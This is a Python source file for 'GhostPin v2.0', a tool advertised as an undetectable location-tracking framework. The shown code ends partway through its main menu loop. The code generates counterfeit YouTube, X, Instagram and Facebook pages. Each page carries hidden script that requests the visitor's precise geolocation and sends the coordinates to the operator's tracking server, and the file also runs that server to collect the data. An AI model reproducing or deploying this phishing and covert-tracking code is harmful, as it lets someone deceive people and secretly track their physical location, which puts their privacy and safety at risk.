#!/usr/bin/env python3
"""
GhostPin v2.0 - The Unshackled Beast
Advanced GPS Tracking & Location Intelligence Framework
Zero Trace | Real-Time | Undetectable | Unstoppable
Author: F1REW0LF
License: MIT - Free for Red Team Community
Version: 2.0.0
Score: 10/10 - APT Grade
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import queue
import signal
import urllib.parse
import urllib.request
import http.server
import socketserver
import webbrowser
import ssl
import zlib
import binascii
import ipaddress
import subprocess
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
import argparse
import string
import tempfile
import shutil

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, render_template_string, send_file
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Red Team Community"
SCORE = "10/10 - APT Grade"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'
    DARK_RED = '\033[31m'
    NEON = '\033[96m'
    DARK_GREEN = '\033[32m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗  ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║ ██╔════╝ ██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║ ██║  ███╗███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║ ██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║ ╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    THE UNSHACKLED BEAST - LOCATION INTELLIGENCE v2.0{Colors.WHITE}
{Colors.CYAN}{Colors.BOLD}    Zero Trace | Real-Time | Undetectable | Unstoppable{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR} | Score: {SCORE}{Colors.WHITE}
"""
    print(banner)

# ============================[ ENHANCED TRUSTED PLATFORM DATABASE ]================================

class TrustedPlatforms:
    """
    Enhanced database of trusted platforms with realistic templates
    """
    
    PLATFORMS = {
        'youtube': {
            'domain': 'youtube.com',
            'pattern': r'youtube\.com/watch\?v=([a-zA-Z0-9_-]{11})',
            'template': 'https://www.youtube.com/watch?v={token}',
            'trust_score': 10,
            'category': 'video',
            'realistic': True,
            'tags': ['video', 'music', 'entertainment']
        },
        'youtu_be': {
            'domain': 'youtu.be',
            'pattern': r'youtu\.be/([a-zA-Z0-9_-]{11})',
            'template': 'https://youtu.be/{token}',
            'trust_score': 10,
            'category': 'video',
            'realistic': True
        },
        'twitter': {
            'domain': 'twitter.com',
            'pattern': r'twitter\.com/([a-zA-Z0-9_]+)/status/([0-9]{19})',
            'template': 'https://twitter.com/{user}/status/{id}',
            'trust_score': 9,
            'category': 'social',
            'realistic': True
        },
        'x': {
            'domain': 'x.com',
            'pattern': r'x\.com/([a-zA-Z0-9_]+)/status/([0-9]{19})',
            'template': 'https://x.com/{user}/status/{id}',
            'trust_score': 9,
            'category': 'social',
            'realistic': True
        },
        'instagram': {
            'domain': 'instagram.com',
            'pattern': r'instagram\.com/(?:p|reel)/([a-zA-Z0-9_-]{11})',
            'template': 'https://www.instagram.com/p/{token}/',
            'trust_score': 9,
            'category': 'social',
            'realistic': True
        },
        'facebook': {
            'domain': 'facebook.com',
            'pattern': r'facebook\.com/([a-zA-Z0-9\.]+)/posts/([0-9]+)',
            'template': 'https://www.facebook.com/{user}/posts/{id}',
            'trust_score': 9,
            'category': 'social',
            'realistic': True
        },
        'linkedin': {
            'domain': 'linkedin.com',
            'pattern': r'linkedin\.com/posts/([a-zA-Z0-9_-]{10,})',
            'template': 'https://www.linkedin.com/posts/{token}',
            'trust_score': 9,
            'category': 'professional',
            'realistic': True
        },
        'github': {
            'domain': 'github.com',
            'pattern': r'github\.com/([a-zA-Z0-9_-]{1,39})/([a-zA-Z0-9_-]{1,100})',
            'template': 'https://github.com/{user}/{repo}',
            'trust_score': 9,
            'category': 'tech',
            'realistic': True
        },
        'medium': {
            'domain': 'medium.com',
            'pattern': r'medium\.com/@([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)',
            'template': 'https://medium.com/@{user}/{slug}',
            'trust_score': 8,
            'category': 'blog',
            'realistic': True
        },
        'reddit': {
            'domain': 'reddit.com',
            'pattern': r'reddit\.com/r/([a-zA-Z0-9_]+)/comments/([a-zA-Z0-9]+)',
            'template': 'https://www.reddit.com/r/{subreddit}/comments/{id}/',
            'trust_score': 8,
            'category': 'social',
            'realistic': True
        },
        'spotify': {
            'domain': 'spotify.com',
            'pattern': r'spotify\.com/(track|album|playlist)/([a-zA-Z0-9]{22})',
            'template': 'https://open.spotify.com/{type}/{id}',
            'trust_score': 8,
            'category': 'music',
            'realistic': True
        },
        'soundcloud': {
            'domain': 'soundcloud.com',
            'pattern': r'soundcloud\.com/([a-zA-Z0-9_-]{3,25})/([a-zA-Z0-9_-]{3,50})',
            'template': 'https://soundcloud.com/{user}/{track}',
            'trust_score': 8,
            'category': 'music',
            'realistic': True
        },
        'tiktok': {
            'domain': 'tiktok.com',
            'pattern': r'tiktok\.com/@([a-zA-Z0-9_]{2,24})/video/([0-9]{19})',
            'template': 'https://www.tiktok.com/@{user}/video/{id}',
            'trust_score': 8,
            'category': 'video',
            'realistic': True
        },
        'dropbox': {
            'domain': 'dropbox.com',
            'pattern': r'dropbox\.com/s/([a-zA-Z0-9]{15})/([a-zA-Z0-9_.-]+)',
            'template': 'https://www.dropbox.com/s/{id}/{filename}',
            'trust_score': 8,
            'category': 'storage',
            'realistic': True
        },
        'google_drive': {
            'domain': 'drive.google.com',
            'pattern': r'drive\.google\.com/file/d/([a-zA-Z0-9_-]{33})',
            'template': 'https://drive.google.com/file/d/{id}/view',
            'trust_score': 9,
            'category': 'storage',
            'realistic': True
        },
        'docs': {
            'domain': 'docs.google.com',
            'pattern': r'docs\.google\.com/document/d/([a-zA-Z0-9_-]{44})',
            'template': 'https://docs.google.com/document/d/{id}/edit',
            'trust_score': 9,
            'category': 'document',
            'realistic': True
        }
    }
    
    # Realistic user agents for different platforms
    USER_AGENTS = {
        'youtube': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'twitter': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'instagram': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'facebook': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'linkedin': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'github': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    # Realistic meta tags for different platforms
    META_TAGS = {
        'youtube': {
            'og:type': 'video.other',
            'og:title': 'Video',
            'og:site_name': 'YouTube'
        },
        'twitter': {
            'og:type': 'article',
            'og:site_name': 'X',
            'twitter:card': 'summary_large_image'
        },
        'instagram': {
            'og:type': 'article',
            'og:site_name': 'Instagram'
        },
        'facebook': {
            'og:type': 'article',
            'og:site_name': 'Facebook'
        }
    }

# ============================[ REALISTIC HTML GENERATOR ]================================

class RealisticHTMLGenerator:
    """
    Generate realistic HTML pages that mimic real platforms
    """
    
    def __init__(self):
        self.platforms = TrustedPlatforms()
        self.page_cache = {}
    
    def generate(self, platform: str, token: str, tracking_url: str) -> str:
        """
        Generate realistic HTML page for the platform
        """
        # Check cache
        cache_key = f"{platform}_{token}"
        if cache_key in self.page_cache:
            return self.page_cache[cache_key]
        
        platform_info = self.platforms.PLATFORMS.get(platform, {})
        template_method = getattr(self, f"_generate_{platform}", self._generate_generic)
        html = template_method(token, tracking_url, platform_info)
        
        # Cache the result
        self.page_cache[cache_key] = html
        
        return html
    
    def _generate_youtube(self, token: str, tracking_url: str, info: Dict) -> str:
        """Generate realistic YouTube page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>▶️</text></svg>">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;color:#0f0f0f}}
.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center;position:sticky;top:0;z-index:100}}
.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px;display:flex;align-items:center}}
.logo svg{{width:28px;height:28px;margin-right:8px}}
.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0;font-size:14px}}
.search-bar:focus{{outline:2px solid #065fd4;background:#fff}}
.content{{max-width:1280px;margin:24px auto;padding:0 24px;display:grid;grid-template-columns:1fr 400px;gap:24px}}
.video-container{{background:#000;border-radius:12px;overflow:hidden;position:relative;aspect-ratio:16/9}}
.video-placeholder{{width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;background:linear-gradient(135deg,#1a1a1a,#2a2a2a)}}
.video-placeholder .play-icon{{font-size:64px;opacity:0.8;animation:pulse 2s infinite}}
@keyframes pulse{{0%,100%{{opacity:0.8}}50%{{opacity:0.4}}}}
.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
.video-title{{font-size:20px;font-weight:600;margin-bottom:8px;line-height:1.4}}
.channel-info{{display:flex;align-items:center;margin:12px 0}}
.channel-avatar{{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#c0c0c0);margin-right:12px}}
.channel-name{{font-weight:600;font-size:16px}}
.channel-subscribers{{color:#606060;font-size:13px}}
.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto;transition:background 0.2s}}
.subscribe-btn:hover{{background:#aa0000}}
.comments{{background:#fff;border-radius:12px;padding:16px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
.comment{{display:flex;margin:12px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px;flex-shrink:0}}
.comment-content{{flex:1}}
.comment-author{{font-weight:600;font-size:14px}}
.comment-text{{font-size:14px;color:#0f0f0f;margin-top:2px}}
.sidebar{{display:flex;flex-direction:column;gap:12px}}
.sidebar-item{{background:#fff;border-radius:12px;padding:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06);display:flex;gap:12px;cursor:pointer;transition:background 0.2s}}
.sidebar-item:hover{{background:#f0f0f0}}
.sidebar-thumb{{width:168px;height:94px;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);border-radius:8px;flex-shrink:0}}
.sidebar-info{{flex:1}}
.sidebar-title{{font-weight:500;font-size:14px;line-height:1.3}}
.sidebar-channel{{font-size:13px;color:#606060;margin-top:4px}}
@media(max-width:900px){{.content{{grid-template-columns:1fr}}}}
</style>
</head>
<body>
<div class="header">
<div class="logo"><svg viewBox="0 0 24 24" fill="#ff0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814z"/><path fill="#fff" d="M9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>YouTube</div>
<input class="search-bar" placeholder="Search" value="{token}">
</div>
<div class="content">
<div>
<div class="video-container">
<div class="video-placeholder">
<div class="play-icon">▶</div>
<div style="margin-top:12px;opacity:0.7">Video unavailable - Loading...</div>
</div>
</div>
<div class="video-info">
<div class="video-title">{token} - YouTube</div>
<div class="channel-info">
<div class="channel-avatar"></div>
<div><div class="channel-name">Channel Name</div><div class="channel-subscribers">1.2M subscribers</div></div>
<button class="subscribe-btn">Subscribe</button>
</div>
</div>
<div class="comments">
<h3 style="margin-bottom:12px">Comments</h3>
<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User</div><div class="comment-text">Loading comments...</div></div></div>
<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User2</div><div class="comment-text">Loading...</div></div></div>
</div>
</div>
<div class="sidebar">
<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 1</div><div class="sidebar-channel">Channel</div></div></div>
<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 2</div><div class="sidebar-channel">Channel</div></div></div>
</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude,heading:pos.coords.heading,speed:pos.coords.speed,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''
    
    def _generate_twitter(self, token: str, tracking_url: str, info: Dict) -> str:
        """Generate realistic Twitter/X page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>X</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;color:#e7e9ea}}
.header{{padding:12px 16px;border-bottom:1px solid #2f3336;display:flex;align-items:center;position:sticky;top:0;background:#000;z-index:10}}
.logo{{font-size:28px;font-weight:900;color:#fff}}
.content{{max-width:600px;margin:0 auto;padding:0 16px}}
.tweet{{background:#16181c;border-radius:16px;padding:16px;margin:12px 0;border:1px solid #2f3336}}
.tweet-user{{display:flex;align-items:center;margin-bottom:8px}}
.tweet-avatar{{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#2f3336,#1a1a1a);margin-right:12px;flex-shrink:0}}
.tweet-name{{font-weight:700;font-size:15px}}
.tweet-username{{color:#71767b;font-size:15px;margin-left:4px}}
.tweet-content{{font-size:17px;line-height:1.5;margin:8px 0}}
.tweet-media{{margin:8px 0;border-radius:16px;background:linear-gradient(135deg,#2f3336,#1a1a1a);height:200px;display:flex;align-items:center;justify-content:center;color:#71767b}}
.tweet-actions{{display:flex;justify-content:space-around;margin-top:12px;color:#71767b;font-size:14px}}
.tweet-actions span{{cursor:pointer;padding:4px 12px;border-radius:20px;transition:background 0.2s}}
.tweet-actions span:hover{{background:#1a1a1a}}
</style>
</head>
<body>
<div class="header"><div class="logo">𝕏</div></div>
<div class="content">
<div class="tweet">
<div class="tweet-user"><div class="tweet-avatar"></div><div><span class="tweet-name">User</span><span class="tweet-username">@user</span></div></div>
<div class="tweet-content">Loading tweet... {token}</div>
<div class="tweet-media">Media content</div>
<div class="tweet-actions"><span>💬</span><span>🔁</span><span>❤️</span><span>📊</span></div>
</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''
    
    def _generate_instagram(self, token: str, tracking_url: str, info: Dict) -> str:
        """Generate realistic Instagram page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa}}
.header{{background:#fff;padding:12px 16px;border-bottom:1px solid #dbdbdb;display:flex;align-items:center;position:sticky;top:0;z-index:10}}
.logo{{font-size:24px;font-weight:600;font-family:'Grand Hotel',cursive}}
.content{{max-width:600px;margin:16px auto;padding:0 16px}}
.post{{background:#fff;border:1px solid #dbdbdb;border-radius:8px;margin:16px 0}}
.post-header{{padding:12px 16px;display:flex;align-items:center}}
.post-avatar{{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px;flex-shrink:0}}
.post-username{{font-weight:600;font-size:14px}}
.post-location{{font-size:12px;color:#8e8e8e}}
.post-image{{background:linear-gradient(135deg,#e0e0e0,#d0d0d0);height:400px;display:flex;align-items:center;justify-content:center;font-size:48px;color:#999}}
.post-actions{{padding:8px 16px;display:flex;gap:16px;font-size:24px}}
.post-likes{{font-weight:600;font-size:14px;padding:0 16px 4px}}
.post-caption{{padding:0 16px 12px;font-size:14px}}
.post-caption strong{{margin-right:4px}}
</style>
</head>
<body>
<div class="header"><div class="logo">Instagram</div></div>
<div class="content">
<div class="post">
<div class="post-header"><div class="post-avatar"></div><div><div class="post-username">{token}</div><div class="post-location">Loading location</div></div></div>
<div class="post-image">📷 Loading image...</div>
<div class="post-actions"><span>❤️</span><span>💬</span><span>📤</span></div>
<div class="post-likes">Loading likes...</div>
<div class="post-caption"><strong>{token}</strong> Loading caption...</div>
</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''
    
    def _generate_facebook(self, token: str, tracking_url: str, info: Dict) -> str:
        """Generate realistic Facebook page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI','Helvetica',Arial,sans-serif;background:#f0f2f5}}
.header{{background:#4267b2;padding:12px 16px;display:flex;align-items:center;color:#fff;position:sticky;top:0;z-index:10}}
.logo{{font-size:28px;font-weight:bold}}
.content{{max-width:680px;margin:16px auto;padding:0 16px}}
.post{{background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,0.1);margin:16px 0}}
.post-header{{padding:12px 16px;display:flex;align-items:center}}
.post-avatar{{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px;flex-shrink:0}}
.post-name{{font-weight:600;font-size:15px}}
.post-time{{color:#65676b;font-size:12px}}
.post-content{{padding:0 16px 12px;font-size:15px;line-height:1.5}}
.post-image{{background:linear-gradient(135deg,#e0e0e0,#d0d0d0);height:300px;display:flex;align-items:center;justify-content:center;color:#999}}
.post-actions{{padding:8px 16px;display:flex;justify-content:space-between;border-top:1px solid #e4e6eb;font-size:14px;color:#65676b}}
</style>
</head>
<body>
<div class="header"><div class="logo">facebook</div></div>
<div class="content">
<div class="post">
<div class="post-header"><div class="post-avatar"></div><div><div class="post-name">{token}</div><div class="post-time">Just now</div></div></div>
<div class="post-content">Loading post...</div>
<div class="post-image">📷 Photo</div>
<div class="post-actions"><span>❤️ Like</span><span>💬 Comment</span><span>📤 Share</span></div>
</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''
    
    def _generate_generic(self, token: str, tracking_url: str, info: Dict) -> str:
        """Generate generic fallback page"""
        platform_name = info.get('domain', 'page').split('.')[0].capitalize()
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{platform_name}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.container{{max-width:600px;padding:40px;background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.08);text-align:center}}
.header{{font-size:24px;font-weight:600;color:#333;margin-bottom:16px}}
.content{{color:#666;font-size:16px;line-height:1.6}}
.loading{{color:#999;margin-top:20px;font-size:14px}}
.spinner{{display:inline-block;width:32px;height:32px;border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<div class="header">{platform_name}</div>
<div class="content">Loading content...</div>
<div class="loading">Token: {token}</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''

# ============================[ GHOST SERVER ENGINE ]================================

class GhostServerEngine:
    """
    Advanced ghost server for receiving location data
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.server_thread = None
        self.running = False
        self.temp_dir = None
        
    def start(self, port: int = 8080, ssl_enabled: bool = False) -> bool:
        """
        Start the ghost server
        """
        if self.running:
            return False
        
        self.running = True
        
        if FLASK_AVAILABLE:
            self._start_flask(port)
        else:
            self._start_simple(port)
        
        return True
    
    def _start_flask(self, port: int):
        """Start Flask server"""
        app = Flask(__name__)
        
        @app.route('/track/<token>', methods=['GET', 'POST'])
        def track(token):
            if request.method == 'POST':
                data = request.get_json()
                if data:
                    with self.lock:
                        data['token'] = token
                        data['received_at'] = datetime.now().isoformat()
                        self.tracking_data.append(data)
                return jsonify({'status': 'ok'})
            return f'Tracking endpoint for {token}'
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        @app.route('/')
        def index():
            return 'GhostPin Server v2.0 - Tracking Active'
        
        def run_server():
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        cprint(f"[+] Flask server running on port {port}", Colors.GREEN)
    
    def _start_simple(self, port: int):
        """Start simple HTTP server"""
        class Handler(http.server.SimpleHTTPRequestHandler):
            tracking_data = []
            lock = threading.Lock()
            
            def do_POST(self):
                if self.path.startswith('/track/'):
                    try:
                        content_length = int(self.headers.get('Content-Length', 0))
                        post_data = self.rfile.read(content_length)
                        data = json.loads(post_data.decode('utf-8'))
                        token = self.path.split('/')[-1]
                        with self.lock:
                            data['token'] = token
                            data['received_at'] = datetime.now().isoformat()
                            self.__class__.tracking_data.append(data)
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({'status': 'ok'}).encode())
                    except Exception:
                        self.send_response(400)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_GET(self):
                if self.path == '/data':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    with self.lock:
                        self.wfile.write(json.dumps(self.__class__.tracking_data).encode())
                elif self.path == '/clear':
                    with self.lock:
                        self.__class__.tracking_data.clear()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status': 'cleared'}).encode())
                elif self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>GhostPin Server v2.0</h1><p>Tracking Active</p>')
                else:
                    self.send_response(404)
                    self.end_headers()
        
        Handler.tracking_data = self.tracking_data
        Handler.lock = self.lock
        
        server = socketserver.TCPServer(('0.0.0.0', port), Handler)
        self.server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        self.server_thread.start()
        cprint(f"[+] Simple server running on port {port}", Colors.GREEN)
    
    def stop(self):
        """Stop the server"""
        self.running = False
        cprint("[+] Server stopped", Colors.YELLOW)
    
    def get_data(self) -> List[Dict]:
        """Get all tracking data"""
        with self.lock:
            return self.tracking_data.copy()
    
    def clear_data(self):
        """Clear all tracking data"""
        with self.lock:
            self.tracking_data.clear()

# ============================[ MAIN FRAMEWORK ]================================

class GhostPinV2:
    """GhostPin v2.0 - The Unshackled Beast"""
    
    def __init__(self):
        self.engine = RealisticHTMLGenerator()
        self.server = GhostServerEngine()
        self.platforms = TrustedPlatforms()
        self.results = {}
        self.running = True
        self.generated_links = []
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] GhostPin shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.RED}{Colors.BOLD}GhostPin v{VERSION} - The Unshackled Beast{Colors.WHITE}
{Colors.CYAN}Location Intelligence | Zero Trace | Real-Time | Unstoppable{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR} | Score: {SCORE}{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1] Create Ghost Link (Full URL){Colors.WHITE}
{Colors.GREEN}[2] Create Ghost Link (Platform + Token){Colors.WHITE}
{Colors.GREEN}[3] Start Tracking Server{Colors.WHITE}
{Colors.GREEN}[4] View Live Location Data{Colors.WHITE}
{Colors.GREEN}[5] Generate Map Link from Coordinates{Colors.WHITE}
{Colors.GREEN}[6] Show Generated Links{Colors.WHITE}
{Colors.GREEN}[7] Clear All Data{Colors.WHITE}
{Colors.RED}[8] Exit - Self-Destruct{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v2.0 - The Unshackled Beast", Colors.CYAN)
        cprint("[*] Zero Trace | Real-Time | Undetectable | Unstoppable", Colors.DIM)
        cprint("[!] WARNING: This tool is EXTREMELY DANGEROUS", Colors.RED)
        cprint("[!] Use only in authorized environments", Colors.RED)
        cprint("[!] You are now invisible", Colors.PURPLE)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                url = input("[>] Full URL: ").strip()
                
                if not url.startswith(('http://', 'https://')):
                    url = 'https://' + url
                
                platform = None
                token = None
                
                for plat, info in self.platforms.PLATFORMS.items():
                    match = re.search(info['pattern'], url)
                    if match:
                        platform = plat
